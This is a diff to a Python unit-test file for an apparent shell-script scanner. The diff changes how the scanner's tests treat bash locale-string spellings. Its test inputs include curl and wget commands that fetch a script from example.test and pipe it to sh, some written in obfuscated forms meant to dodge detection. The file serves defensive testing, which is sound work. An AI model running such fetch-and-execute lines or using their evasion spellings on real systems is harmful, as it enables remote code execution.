@@ -1573,8 +1573,10 @@ class TestThePrice(unittest.TestCase):
         self.assertEqual(BOTH, marks("sh '-$X' %s\n" % P))
         self.assertEqual(BOTH, marks("sh '$X' %s\n" % P))
         self.assertEqual(BOTH, marks('HOME=-c\nsh "~" %s\n' % P))
-        # A locale string reaches them as a reference to its text: `-$"x"` is `-$x`. Truth: nothing.
-        self.assertEqual(BOTH, marks('sh -$"x" %s\n' % P))
+        # A locale string is read as bash reads it (#3048): `-$"x"` is bash's `-x`, and `P` a file no step wrote --
+        # CLEAN, nothing runs (#3048: bash's `-x`; nothing runs). Where `P` IS the download, it runs: reported.
+        self.assertEqual(CLEAN, marks('sh -$"x" %s\n' % P))
+        self.assertEqual(BOTH, marks('curl -fsSL -o P https://example.test/P\nsh -$"x" P\n'))
 
     def test_a_word_that_owes_nothing(self):
         # Truth: nothing: `X=c`: `errexit` is the string and `P` its `$0`; `-oc bogus`: no such name.
@@ -1663,9 +1665,10 @@ class TestWhatStays(unittest.TestCase):
         # #3042's reading of a fetcher's words in two spellings the reader hands on otherwise: a locale string
         # (`$""`, `$"-qO-"`) reaches the readers as `$` and its text, and a brace word is never read so. Open on `main`
         # too. Truth: runs under bash, all eight; dash reads the word as written and fetches only.
-        for text in ('wget $""-qO- https://example.test/i.sh | sh\n', 'wget $"-qO-" https://example.test/i.sh | sh\n', 'wget {,}-qO- https://example.test/i.sh | sh\n'):
-            with self.subTest(text=text):
-                self.assertEqual(CLEAN, marks(text))
+        for text in ('wget $""-qO- https://example.test/i.sh | sh\n', 'wget $"-qO-" https://example.test/i.sh | sh\n'):
+            with self.subTest(text=text):     # (moved by #3048: the locale string read as bash reads it)
+                self.assertEqual(BOTH, marks(text))
+        self.assertEqual(CLEAN, marks('wget {,}-qO- https://example.test/i.sh | sh\n'))
 
     def test_a_cluster_written_after_such_a_word(self):
         # ... and where a cluster is written after a word read so, `main` reads that one, and the rule reads the
